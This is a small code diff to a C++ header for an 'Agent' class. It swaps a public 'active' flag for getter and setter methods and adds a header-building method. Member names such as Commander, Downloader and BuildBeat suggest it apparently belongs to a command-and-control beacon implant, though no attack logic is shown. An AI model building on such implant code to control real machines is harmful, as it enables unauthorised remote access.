@@ -13,8 +13,6 @@ class Agent
 	AgentInfo* info;
 
 public:
-	bool active = true;
-
 	AgentConfig* config;
 	Commander*   commander;
 	Downloader*  downloader;
@@ -22,5 +20,8 @@ public:
 
 	Agent();
 
+	void  SetActive(bool state);
+	bool  IsActive();
 	LPSTR BuildBeat();
+	LPSTR CreateHeaders();
 };
